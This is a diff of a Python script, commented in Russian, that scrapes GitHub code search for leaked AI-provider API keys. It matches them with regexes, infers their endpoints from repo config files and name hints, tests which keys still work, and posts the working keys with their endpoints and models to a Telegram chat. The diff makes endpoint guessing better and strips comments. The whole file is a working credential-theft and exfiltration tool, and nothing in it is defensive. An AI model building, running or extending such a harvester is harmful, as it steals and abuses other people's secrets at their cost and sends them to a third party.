@@ -17,11 +17,9 @@ BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
 
-# Настройки времени
-TOTAL_RUN_TIME = 3600  # Работать 1 час
-REPORT_INTERVAL = 900  # Отчет каждые 15 минут
+TOTAL_RUN_TIME = 3600
+REPORT_INTERVAL = 900
 
-# Паттерны ключей
 KEY_PATTERNS = [
     {"provider": "openai",      "regex": re.compile(r"\bsk-proj-[A-Za-z0-9_-]{20,}\b")},
     {"provider": "anthropic",   "regex": re.compile(r"\bsk-ant-(?:api\d{2}-)?[A-Za-z0-9_-]{20,}\b")},
@@ -36,11 +34,58 @@ KEY_PATTERNS = [
 
 URL_REGEX = re.compile(r'https?://[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(?:/[a-zA-Z0-9._-]*)*(?:/v1)?')
 
+PROVIDER_ENDPOINTS = {
+    "openai": "https://api.openai.com/v1",
+    "anthropic": "https://api.anthropic.com/v1",
+    "kimi": "https://api.moonshot.cn/v1",
+    "minimax": "https://api.minimaxi.com/v1",
+    "qwen": "https://dashscope.aliyuncs.com/compatible-mode/v1",
+    "deepseek": "https://api.deepseek.com/v1",
+    "huggingface": "https://api-inference.huggingface.co",
+    "generic-sk": "https://chat.kxsb.org/api/v1",
+    "default": "https://chat.kxsb.org/api/v1"
+}
+
+REPO_HINTS = {
+    "mistral": "https://api.mistral.ai/v1", "groq": "https://api.groq.com/openai/v1",
+    "together": "https://api.together.xyz/v1", "fireworks": "https://api.fireworks.ai/inference/v1",
+    "perplexity": "https://api.perplexity.ai", "openrouter": "https://openrouter.ai/api/v1",
+    "cerebras": "https://api.cerebras.ai/v1", "deepinfra": "https://api.deepinfra.com/v1/openai",
+}
+
+# КЭШ URL-ов для репозиториев, чтобы не скачивать конфиги дважды
+repo_url_cache = {}
+
+def get_urls_from_repo_configs(repo):
+    """Ищет URL в типичных файлах конфигурации (.env, config.py) в корне репо"""
+    if repo in repo_url_cache:
+        return repo_url_cache[repo]
+        
+    config_files = ["config.py", "settings.py", "config.json", ".env"]
+    found_urls = []
+    
+    for file_path in config_files:
+        try:
+            url = f"https://api.github.com/repos/{repo}/contents/{file_path}"
+            resp = requests.get(url, headers={"Authorization": f"Bearer {GITHUB_TOKEN}", "Accept": "application/vnd.github.raw+json"}, timeout=5)
+            if resp.status_code == 200:
+                urls = URL_REGEX.findall(resp.text)
+                for u in urls:
+                    if any(x in u for x in ['github.com', 'telegram', 'w3.org']):
+                        continue
+                    match = re.search(r'(.*?/v\d+(?:beta\d*)?|.*?/api)', u)
+                    if match:
+                        found_urls.append(match.group(1))
+        except:
+            pass
+            
+    repo_url_cache[repo] = list(set(found_urls))
+    return repo_url_cache[repo]
+
 def fetch_targets():
     logger.info("🔎 Ищу ключи и эндпоинты на GitHub...")
     headers = {"Authorization": f"Bearer {GITHUB_TOKEN}", "Accept": "application/vnd.github+json"}
     
-    # Рандомизация, чтобы искать разные файлы
     queries = ["sk- language:Python", "sk- language:JavaScript", "sk- language:TypeScript", "hf_ language:Python"]
     query = random.choice(queries)
     page = random.randint(1, 5)
@@ -48,14 +93,13 @@ def fetch_targets():
     try:
         resp = requests.get("https://api.github.com/search/code", headers=headers, params={"q": query, "per_page": 30, "page": page}, timeout=15)
         if resp.status_code == 403:
-            logger.error("❌ ОШИБКА 403: Токен не подходит. Нужен Classic Token с public_repo!")
+            logger.error("❌ ОШИБКА 403: Токен не подходит.")
             return []
         resp.raise_for_status()
         
         items = resp.json().get("items", [])
-        logger.info(f"✅ Найдено файлов на странице {page}: {len(items)}")
-        
         targets = []
+        
         for item in items[:15]:
             repo = item["repository"]["full_name"]
             path = item["path"]
@@ -63,40 +107,43 @@ def fetch_targets():
             
             if file_resp.status_code == 200:
                 text = file_resp.text
-                urls = URL_REGEX.findall(text)
-                api_urls = []
+                lines = text.split('\n')
                 
-                # УМНОЕ ОБРЕЗАНИЕ URL
-                for u in urls:
-                    if any(x in u for x in ['github.com', 'telegram', 'w3.org', '.jpeg', '.png', '.jpg']):
-                        continue
-                    
-                    match = re.search(r'(.*?/v\d+(?:beta\d*)?)', u)
-                    if match:
-                        api_urls.append(match.group(1))
-                        continue
-                        
-                    match = re.search(r'(.*?/api)', u)
-                    if match:
-                        api_urls.append(match.group(1))
-                        continue
-                        
-                    if u.count('/') == 2:
-                        api_urls.append(f"{u}/v1")
-                        continue
-                        
-                    if 'api.' in u or 'ai.' in u:
-                        api_urls.append(u)
-
-                api_urls = list(set(api_urls))
-                if not api_urls:
-                    api_urls = ["https://chat.kxsb.org/api/v1"]
-
-                for p in KEY_PATTERNS:
-                    for match in p["regex"].finditer(text):
-                        token = match.group(0)
-                        for url in api_urls[:3]:
-                            targets.append({"key": token, "endpoint": url.rstrip('/'), "provider": p["provider"]})
+                for line in lines:
+                    for p in KEY_PATTERNS:
+                        for match in p["regex"].finditer(line):
+                            token = match.group(0)
+                            api_urls = []
+                            
+                            # 1. Ищем на той же строке
+                            urls = URL_REGEX.findall(line)
+                            for u in urls:
+                                if any(x in u for x in ['github.com', 'telegram', 'w3.org', '.jpeg', '.png']):
+                                    continue
+                                match_url = re.search(r'(.*?/v\d+(?:beta\d*)?|.*?/api)', u)
+                                if match_url:
+                                    api_urls.append(match_url.group(1))
+                            
+                            # 2. Ищем в конфигах репозитория (тот самый "другой файл")
+                            if not api_urls:
+                                repo_urls = get_urls_from_repo_configs(repo)
+                                if repo_urls:
+                                    api_urls.extend(repo_urls[:2]) # Берем первые 2 найденных
+                            
+                            # 3. Ищем подсказку в названии репозитория
+                            if not api_urls:
+                                combined_text = (repo + " " + path).lower()
+                                for hint, url in REPO_HINTS.items():
+                                    if hint in combined_text:
+                                        api_urls.append(url)
+                                        break
+                                        
+                            # 4. Фоллбек по префиксу
+                            if not api_urls:
+                                api_urls.append(PROVIDER_ENDPOINTS.get(p["provider"], PROVIDER_ENDPOINTS["default"]))
+                                
+                            for url in list(set(api_urls))[:2]:
+                                targets.append({"key": token, "endpoint": url.rstrip('/'), "provider": p["provider"]})
             time.sleep(1)
             
         unique_targets = []
@@ -139,17 +186,9 @@ def format_report(key, endpoint, models, probes):
     working = [p for p in probes if p["ok"]]
     if not working:
         return None
-        
-    lines = [
-        "🔑 Новый ключ",
-        "",
-        f"🌐 API — {endpoint}",
-        f"🗝 Ключ — {key}",
-        "✅ Работают —"
-    ]
+    lines = ["🔑 Новый ключ", "", f"🌐 API — {endpoint}", f"🗝 Ключ — {key}", "✅ Работают —"]
     for p in working:
         lines.append(f"{p['model']} — {p['latency']}s (pong)")
-        
     lines.append(f"📦 Все модели — " + ", ".join(models[:5]))
     if len(models) > 5:
         lines.append(f"и ещё {len(models) - 5} за кадром")
@@ -157,12 +196,9 @@ def format_report(key, endpoint, models, probes):
 
 async def long_scan_loop():
     app = ApplicationBuilder().token(BOT_TOKEN).build()
-    
-    checked_keys = set() # КЭШ: чтобы не проверять одно и то же
-    
+    checked_keys = set()
     start_time = time.time()
     cycle_start_time = time.time()
-    
     total_checked = 0
     total_working = 0
     cycle_working = 0
@@ -175,14 +211,11 @@ async def long_scan_loop():
         
         for t in targets:
             key, endpoint = t["key"], t["endpoint"]
-            
-            # Проверка кэша
             if key in checked_keys:
                 continue
             checked_keys.add(key)
             
             logger.info(f"Проверяю {key[:10]}... на {endpoint}")
-            
             models = await asyncio.to_thread(check_endpoint, key, endpoint)
             if not models:
                 logger.info("   └ ❌ Мертвый (нет доступа к /models)")
@@ -201,31 +234,20 @@ async def long_scan_loop():
             else:
                 logger.info("   └ ❌ Мертвый (все пробы 401/403)")
         
-        # Промежуточный отчет
         if time.time() - cycle_start_time >= REPORT_INTERVAL:
-            summary = (
-                f"⏳ **Промежуточный отчет**\n"
-                f"За последние {REPORT_INTERVAL//60} минут:\n"
-                f"Проверено целей: {total_checked}\n"
-                f"Найдено рабочих: {cycle_working}\n\n"
-                f"Бот продолжает работу..."
-            )
+            summary = f"⏳ **Отчет**\nЗа {REPORT_INTERVAL//60} мин:\nЦелей: {total_checked}\nРабочих: {cycle_working}"
             if CHAT_ID:
                 await app.bot.send_message(chat_id=CHAT_ID, text=summary, parse_mode="Markdown")
-            
             cycle_start_time = time.time()
             cycle_working = 0
             
         await asyncio.sleep(5)
 
-    # Финальный отчет
     if CHAT_ID:
-        await app.bot.send_message(chat_id=CHAT_ID, text=f"🛑 Час прошел. Скан завершен. Всего рабочих ключей: {total_working}")
-    logger.info("✅ Длинная сессия завершена.")
+        await app.bot.send_message(chat_id=CHAT_ID, text=f"🛑 Час прошел. Всего рабочих: {total_working}")
+    logger.info("✅ Сессия завершена.")
 
 if __name__ == "__main__":
     if not BOT_TOKEN or not GITHUB_TOKEN:
-        logger.error("Нет токенов!")
         sys.exit(1)
-    
     asyncio.run(long_scan_loop())
